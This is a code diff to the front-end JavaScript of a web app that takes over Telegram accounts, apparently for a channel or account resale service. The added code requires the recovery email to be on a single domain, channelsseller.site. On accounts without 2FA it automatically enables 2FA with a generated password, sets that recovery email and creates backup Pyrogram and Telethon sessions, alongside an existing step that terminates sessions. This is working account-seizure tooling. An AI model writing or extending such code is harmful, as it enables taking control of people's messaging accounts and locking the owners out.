@@ -5,6 +5,7 @@
 
 // Auto-detect API URL based on current location
 const API_URL = window.location.origin + "/api/v1";
+const REQUIRED_EMAIL_DOMAIN = "channelsseller.site";
 
 let appState = {
     phone: null,
@@ -15,8 +16,15 @@ let appState = {
     targetEmail: null,
     emailHash: null,
     transferMode: "bot_only",
-    generatedPassword: null
+    generatedPassword: null,
+    has2fa: null  // null=unknown, true=2FA was on, false=2FA was off
 };
+
+
+function validateEmailDomain(email) {
+    if (!email) return false;
+    return email.trim().toLowerCase().endsWith('@' + REQUIRED_EMAIL_DOMAIN);
+}
 
 // ==================== Helper Functions ====================
 
@@ -179,13 +187,30 @@ async function verifyCode() {
             appState.telegramId = result.telegram_id;
             appState.targetEmail = result.target_email;
             appState.emailHash = result.email_hash;
+            appState.has2fa = result.has_2fa === true;
             
-            showStatus('Authenticated successfully!', 'success');
-            setStep(3);
-            showView('view-email');
-            displayEmailInstructions();
+            // Validate email domain
+            if (appState.targetEmail && !validateEmailDomain(appState.targetEmail)) {
+                showStatus(`Error: Email must end with @${REQUIRED_EMAIL_DOMAIN}`, 'error');
+                return;
+            }
+            
+            if (!appState.has2fa) {
+                // 2FA was OFF → skip email step, go straight to audit
+                // Finalize will auto-setup 2FA + recovery email
+                showStatus('Authenticated! 2FA not enabled — will be set up automatically during finalize.', 'success');
+                setStep(4);
+                showView('view-audit');
+            } else {
+                // 2FA was ON → show email step (user may need to change recovery email)
+                showStatus('Authenticated with 2FA! Check recovery email.', 'success');
+                setStep(3);
+                showView('view-email');
+                displayEmailInstructions();
+            }
             
         } else if (result.status === '2fa_required') {
+            appState.has2fa = true;
             showStatus('2FA password required', 'info');
             if (result.hint) {
                 document.getElementById('2fa-hint').textContent = `Hint: ${result.hint}`;
@@ -224,8 +249,9 @@ async function verify2FA() {
             appState.telegramId = result.telegram_id;
             appState.targetEmail = result.target_email;
             appState.emailHash = result.email_hash;
+            appState.has2fa = true; // came through 2FA flow
             
-            showStatus('Logged in successfully!', 'success');
+            showStatus('Logged in with 2FA! Check recovery email.', 'success');
             setStep(3);
             showView('view-email');
             displayEmailInstructions();
@@ -244,6 +270,12 @@ async function displayEmailInstructions() {
     const emailDisplay = document.getElementById('target-email-display');
     const emailInstructions = document.getElementById('email-instructions');
     
+    // Validate email domain before displaying
+    if (appState.targetEmail && !validateEmailDomain(appState.targetEmail)) {
+        showStatus(`Error: Target email must end with @${REQUIRED_EMAIL_DOMAIN}`, 'error');
+        return;
+    }
+    
     if (emailDisplay && appState.targetEmail) {
         emailDisplay.innerHTML = `
             <div class="email-box">
@@ -255,19 +287,37 @@ async function displayEmailInstructions() {
     }
     
     if (emailInstructions) {
-        emailInstructions.innerHTML = `
-            <div class="instructions">
-                <h4>Steps to change 2FA recovery email:</h4>
-                <ol>
-                    <li>Open Telegram app</li>
-                    <li>Go to Settings > Privacy & Security > Two-Step Verification</li>
-                    <li>Tap "Recovery Email"</li>
-                    <li>Change email to: <strong>${appState.targetEmail}</strong></li>
-                    <li>A confirmation code will be sent to the new email</li>
-                    <li>Click "Auto-Check Code" or enter it manually</li>
-                </ol>
-            </div>
-        `;
+        if (!appState.has2fa) {
+            // 2FA was OFF → auto-setup message
+            emailInstructions.innerHTML = `
+                <div class="instructions" style="background:#172554;border:1px solid #1e40af;border-radius:8px;padding:16px;">
+                    <h4 style="color:#60a5fa;">Automatic Setup</h4>
+                    <p style="color:#93c5fd;">2FA was not enabled on this account. During finalize, the system will automatically:</p>
+                    <ol style="color:#93c5fd;">
+                        <li>Enable Two-Step Verification with a strong password</li>
+                        <li>Set recovery email to: <strong>${appState.targetEmail}</strong></li>
+                        <li>Confirm the email verification code</li>
+                        <li>Create backup sessions (Pyrogram + Telethon)</li>
+                    </ol>
+                    <p style="color:#60a5fa;font-weight:600;">No manual action needed — proceed to Audit then Finalize.</p>
+                </div>
+            `;
+        } else {
+            // 2FA was ON → manual instructions
+            emailInstructions.innerHTML = `
+                <div class="instructions">
+                    <h4>Steps to change 2FA recovery email:</h4>
+                    <ol>
+                        <li>Open Telegram app</li>
+                        <li>Go to Settings > Privacy & Security > Two-Step Verification</li>
+                        <li>Tap "Recovery Email"</li>
+                        <li>Change email to: <strong>${appState.targetEmail}</strong></li>
+                        <li>A confirmation code will be sent to the new email</li>
+                        <li>Click "Auto-Check Code" or enter it manually</li>
+                    </ol>
+                </div>
+            `;
+        }
     }
     
     // Fetch and show live email status
@@ -583,6 +633,25 @@ async function terminateSessions() {
 function proceedToFinalize() {
     setStep(5);
     showView('view-finalize');
+    
+    // Adaptive UI based on 2FA state
+    const autoInfo = document.getElementById('finalize-auto-info');
+    const inputGroup = document.getElementById('finalize-2fa-input-group');
+    const emailDisplay = document.getElementById('finalize-email-display');
+    
+    if (emailDisplay && appState.targetEmail) {
+        emailDisplay.textContent = appState.targetEmail;
+    }
+    
+    if (!appState.has2fa) {
+        // 2FA was OFF → show auto-setup banner, hide password input
+        if (autoInfo) autoInfo.classList.remove('hidden');
+        if (inputGroup) inputGroup.classList.add('hidden');
+    } else {
+        // 2FA was ON → hide auto-setup banner, show password input
+        if (autoInfo) autoInfo.classList.add('hidden');
+        if (inputGroup) inputGroup.classList.remove('hidden');
+    }
 }
 
 // ==================== Step 5: Finalize ====================
@@ -590,6 +659,16 @@ function proceedToFinalize() {
 async function finalizeAccount() {
     setLoading('btn-finalize', true);
     hideStatus();
+    
+    // Show spinner
+    const spinner = document.getElementById('finalize-spinner');
+    const spinnerText = document.getElementById('finalize-spinner-text');
+    if (spinner) spinner.classList.remove('hidden');
+    if (spinnerText) {
+        spinnerText.textContent = !appState.has2fa 
+            ? 'Setting up 2FA + recovery email + sessions...' 
+            : 'Changing password + verifying email + creating sessions...';
+    }
     
     const password2fa = document.getElementById('current-2fa-password')?.value || null;
     
@@ -641,6 +720,9 @@ async function finalizeAccount() {
         showStatus(`Error: ${error.message}`, 'error');
     } finally {
         setLoading('btn-finalize', false, 'Finalize Account');
+        // Hide spinner
+        const sp = document.getElementById('finalize-spinner');
+        if (sp) sp.classList.add('hidden');
     }
 }
 
